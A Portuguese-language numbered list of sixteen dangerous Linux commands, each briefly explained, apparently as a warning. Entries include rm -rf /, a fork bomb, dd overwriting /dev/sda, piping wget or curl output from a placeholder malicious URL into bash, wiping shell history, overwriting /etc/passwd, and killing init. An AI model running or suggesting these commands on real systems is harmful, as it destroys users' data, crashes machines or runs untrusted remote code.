

1. rm -rf /

Apaga todos os arquivos do sistema sem pedir confirmação.



2. :(){ :|:& };

Conhecido como fork bomb, cria processos recursivamente até travar o sistema.



3. dd if=/dev/random of=/dev/sda

Sobrescreve o disco rígido (/dev/sda) com dados aleatórios, apagando completamente o sistema.



4. chmod -R 777 /

Concede permissão total de leitura, escrita e execução a todos os arquivos, comprometendo a segurança do sistema.



5. wget [malicious URL] -O - | bash

Baixa um script de uma URL maliciosa e o executa diretamente.



6. sudo rm -rf /*

Apaga todos os arquivos do sistema (equivalente ao primeiro, mas com sudo).



7. mv ~ /dev/null

Move todo o diretório do usuário (~) para /dev/null, apagando todos os arquivos pessoais.



8. > ~/.bash_history

Apaga o histórico de comandos do terminal.



9. curl [any URL] | bash

Baixa um script de uma URL e o executa automaticamente, podendo instalar malware.



10. find / -type f -exec rm -f {} \;



Apaga todos os arquivos do sistema.


11. mkfs.*



Formata um disco, apagando todos os dados.


12. echo [malicious content] > /etc/pass...



Pode modificar arquivos críticos de autenticação do sistema.


13. kill -9 1



Mata o processo init, essencial para o funcionamento do sistema, causando um travamento imediato.


14. killall5



Mata todos os processos do sistema, possivelmente causando travamento.


15. shutdown



Desliga o sistema.


16. reboot



Reinicia o sistema.